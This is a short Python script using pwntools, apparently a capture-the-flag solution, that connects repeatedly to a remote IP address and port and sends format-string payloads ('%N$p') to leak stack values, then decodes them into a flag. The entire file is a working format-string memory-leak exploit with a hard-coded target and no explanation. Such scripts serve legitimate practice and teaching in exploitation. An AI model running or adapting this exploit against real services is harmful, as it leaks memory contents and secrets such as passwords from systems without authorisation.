import pwn
import time

i = 1
a = []
while i != 15:
    r = pwn.remote("185.235.41.205", 7050)
    p = "%" + str(i) + "$p"
    r.sendline(p.encode())
    r.recvlines(21)
    admin_pass = r.recvline().decode().split(" ")[-1]
    print(admin_pass)
    a.append(admin_pass)
    i += 1

flag = []
for k in a:
    try:
        flag.append(pwn.p32(int(k, 16)).decode("latin-1"))
    except Exception as e:
        pass

print("".join(flag))
